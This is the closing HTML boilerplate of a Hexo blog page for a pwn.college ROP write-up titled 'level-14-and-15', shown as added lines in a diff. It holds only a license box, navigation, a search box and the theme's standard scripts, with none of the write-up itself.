+  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/Program-Security/ROP/" class="category-chain-item">ROP</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>level-14-and-15</div>
+      <div>http://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 20, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-13/" title="level-13">
+                        <span class="hidden-mobile">level-13</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
